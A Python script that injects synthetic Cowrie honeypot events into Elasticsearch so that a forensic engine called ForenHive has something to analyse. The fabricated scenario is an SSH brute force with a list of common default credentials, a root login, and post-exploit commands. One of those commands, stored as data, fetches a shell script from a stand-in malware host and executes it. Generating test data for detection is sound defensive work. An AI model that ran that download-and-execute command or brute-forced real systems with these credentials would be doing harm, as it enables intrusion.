"""
Inject a synthetic SSH brute-force + compromise scenario for IP 8.8.8.8
into Elasticsearch, matching the exact nested-JSON format that Logstash produces.

Sequence:
  - 15 failed SSH logins (varied credentials)
  - 1 successful login (root / 123456)
  - 3 post-exploit commands (whoami, uname -a, wget malware)
  - session close

All fields use nested objects (not dot-notation), matching Logstash ECS output.
"""

import json
import uuid
from datetime import datetime, timedelta, timezone

import urllib.request

ES = "http://172.16.1.100:9200"


def _post(doc: dict):
    day = doc["@timestamp"][:10].replace("-", ".")
    index = f"honeypot-logs-{day}"
    req = urllib.request.Request(
        f"{ES}/{index}/_doc",
        data=json.dumps(doc).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=5) as r:
        body = json.loads(r.read())
    return body.get("_id", "?")


def _ts(base: datetime, offset_ms: int) -> str:
    return (base + timedelta(milliseconds=offset_ms)).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def scenario_8888_bruteforce(base: datetime):
    """
    8.8.8.8 — SSH brute force leading to full compromise.
    15 failed logins → 1 success → 3 post-exploit commands → session close.
    Uses nested JSON format matching Logstash ECS output.
    """
    ip  = "8.8.8.8"
    sid = f"sess8888_{uuid.uuid4().hex[:8]}"

    # --- session connect ---
    _id = _post({
        "@timestamp": _ts(base, 0),
        "honeypot": {"type": "cowrie"},
        "eventid": "cowrie.session.connect",
        "event": {
            "id": "cowrie.session.connect",
            "action": "session.connect",
            "category": "network",
        },
        "session": {"id": sid},
        "source": {"ip": ip, "port": 49201},
        "destination": {"ip": "172.16.1.100", "port": 2222},
        "network": {"transport": "ssh"},
        "tags": ["cowrie"],
    })
    print(f"  [connect]  {_id}")

    # --- 15 failed logins (mixed credentials) ---
    creds = [
        ("root",     "123456"),
        ("root",     "password"),
        ("root",     "root"),
        ("root",     "admin"),
        ("admin",    "admin"),
        ("admin",    "admin123"),
        ("admin",    "password"),
        ("user",     "user"),
        ("test",     "test"),
        ("pi",       "raspberry"),
        ("ubuntu",   "ubuntu"),
        ("oracle",   "oracle"),
        ("mysql",    "mysql"),
        ("postgres", "postgres"),
        ("git",      "git"),
    ]
    for i, (user, passwd) in enumerate(creds):
        _id = _post({
            "@timestamp": _ts(base, 800 + i * 400),
            "honeypot": {"type": "cowrie"},
            "eventid": "cowrie.login.failed",
            "event": {
                "id": "cowrie.login.failed",
                "category": "authentication",
                "outcome": "failure",
            },
            "session": {"id": sid},
            "source": {"ip": ip},
            "user": {"name": user, "password": passwd},
            "destination": {"port": 2222},
            "network": {"transport": "ssh"},
            "tags": ["cowrie"],
        })
        print(f"  [fail {i+1:02d}]  {user}/{passwd}  → {_id}")

    # --- 1 successful login ---
    _id = _post({
        "@timestamp": _ts(base, 7000),
        "honeypot": {"type": "cowrie"},
        "eventid": "cowrie.login.success",
        "event": {
            "id": "cowrie.login.success",
            "category": "authentication",
            "outcome": "success",
        },
        "session": {"id": sid},
        "source": {"ip": ip},
        "user": {"name": "root", "password": "123456"},
        "destination": {"port": 2222},
        "network": {"transport": "ssh"},
        "tags": ["cowrie"],
    })
    print(f"  [SUCCESS]  root/123456 → {_id}")

    # --- 3 post-exploit commands ---
    commands = [
        "whoami",
        "uname -a",
        "wget http://malware.example.com/bot.sh -O /tmp/bot.sh && chmod +x /tmp/bot.sh && /tmp/bot.sh",
    ]
    for i, cmd in enumerate(commands):
        _id = _post({
            "@timestamp": _ts(base, 8000 + i * 600),
            "honeypot": {"type": "cowrie"},
            "eventid": "cowrie.command.input",
            "event": {
                "id": "cowrie.command.input",
                "category": "process",
            },
            "session": {"id": sid},
            "source": {"ip": ip},
            "input": cmd,
            "process": {"command_line": cmd},
            "destination": {"port": 2222},
            "network": {"transport": "ssh"},
            "tags": ["cowrie"],
        })
        print(f"  [cmd {i+1}]   {cmd[:60]}  → {_id}")

    # --- session close ---
    _id = _post({
        "@timestamp": _ts(base, 11000),
        "honeypot": {"type": "cowrie"},
        "eventid": "cowrie.session.closed",
        "event": {
            "id": "cowrie.session.closed",
            "category": "network",
            "duration": 11,
        },
        "session": {"id": sid},
        "source": {"ip": ip},
        "destination": {"port": 2222},
        "network": {"transport": "ssh"},
        "tags": ["cowrie"],
    })
    print(f"  [close]    {_id}")

    return sid


def main():
    base = datetime.now(timezone.utc).replace(microsecond=0)
    print(f"\n=== ForenHive — Injection SSH brute force 8.8.8.8 ===")
    print(f"Base time : {base.isoformat()}")
    print(f"ES target : {ES}\n")

    sid = scenario_8888_bruteforce(base)

    # Force index refresh so docs are immediately searchable
    day = base.strftime("%Y.%m.%d")
    urllib.request.urlopen(f"{ES}/honeypot-logs-{day}/_refresh", timeout=5).read()

    print(f"\n=== Injection terminée ===")
    print(f"Session ID : {sid}")
    print(f"Index      : honeypot-logs-{day}")
    print(f"Total docs : 20 (1 connect + 15 failed + 1 success + 3 commands + 1 close)")
    print(f"\nProchaine étape : lancer le forensic engine")
    print(f"  docker exec forenhive-forensic-engine python engine.py --hours 1")


if __name__ == "__main__":
    main()
